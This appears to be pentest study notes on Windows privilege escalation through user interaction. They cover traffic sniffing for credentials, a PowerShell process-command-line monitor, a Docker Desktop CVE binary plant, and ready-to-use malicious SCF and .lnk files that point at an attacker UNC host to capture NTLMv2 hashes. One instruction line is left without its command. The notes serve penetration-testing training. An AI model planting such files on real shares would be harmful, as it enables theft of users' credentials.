# Interacting with Users

> [!info] Context
> Users are often the weakest link. After exhausting standard local privesc vectors, techniques that rely on user interaction — sniffing traffic, monitoring commands, placing malicious files on shared drives, or attacking vulnerable services — can reveal credentials that lead to further access.

## Traffic Capture

If **Wireshark** is installed, unprivileged users can often capture traffic, since restricting Npcap driver access to Administrators-only is **not** enabled by default.

> [!tip] Worth checking
> If Wireshark is already installed on a landed box, run a capture — cleartext protocols like FTP can leak credentials directly (e.g. `USER root` / `PASS FTP_adm1n!`).

On an attack box positioned within the environment, running `tcpdump`, Wireshark, or the tool **net-creds** against a live interface (or a saved pcap) can extract credentials and hashes passed over the wire.

## Monitoring Process Command Lines

Some scheduled tasks or processes pass credentials directly on the command line. This loop polls running processes every couple of seconds and diffs the state to catch short-lived commands:

```shellsession
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```

Host the script on the attack machine and  execute it on the target:

## Vulnerable Services (User-Interaction Required)

**CVE-2019-15752** — Docker Desktop Community Edition < 2.1.0.1. On startup, Docker looks for helper binaries (`docker-credential-wincred.exe`, etc.) in `C:\PROGRAMDATA\DockerDesktop\version-bin\`. That directory was misconfigured with full write access for `BUILTIN\Users`, so any authenticated user could drop a malicious executable there.

- Triggers when: (a) Docker Desktop starts, or (b) a user runs `docker login`.
- Doesn't guarantee elevated access immediately — but planting the executable and periodically checking during a long assessment can pay off if the service restarts or the user logs in.

## SCF Abuse on a File Share

A **Shell Command File (SCF)** is used by Explorer for directory navigation UI. Its `IconFile` can be pointed at an attacker-controlled UNC path — when a user simply *browses* to the folder containing the `.scf` file, Explorer initiates an SMB session to that path, letting a listener like **Responder** capture the NTLMv2 hash.

### Malicious SCF File

Name it something plausible so it blends in, e.g. `@Inventory.scf` (the leading `@` sorts it to the top of the directory so it's seen/triggered immediately):

```shellsession
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

## Capturing Hashes with a Malicious .lnk File

> [!info] Why not SCF here
> SCF-based capture no longer works on Server 2019 — a malicious `.lnk` shortcut achieves the same effect instead. Tools like  [Lnkbomb](https://github.com/dievus/lnkbomb) can generate one, or it can be built manually with PowerShell.

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

## Technique Summary

| Technique | Where it runs | Requires |
|---|---|---|
| Wireshark / net-creds traffic capture | Windows target or Linux attack box | Wireshark/Npcap already installed, or position on the wire |
| Process command-line monitor | Windows target (PowerShell) | Local shell access |
| CVE-2019-15752 (Docker) | Windows target | Write access to `DockerDesktop\version-bin\`, vulnerable Docker version |
| SCF file drop + Responder | `.scf` on Windows share; Responder on Linux attacker | Write access to a share, LLMNR/NBT-NS active |
| Malicious `.lnk` file | Windows target (PowerShell to create); triggers on Explorer browse | Applies where SCF no longer works (e.g. Server 2019) |
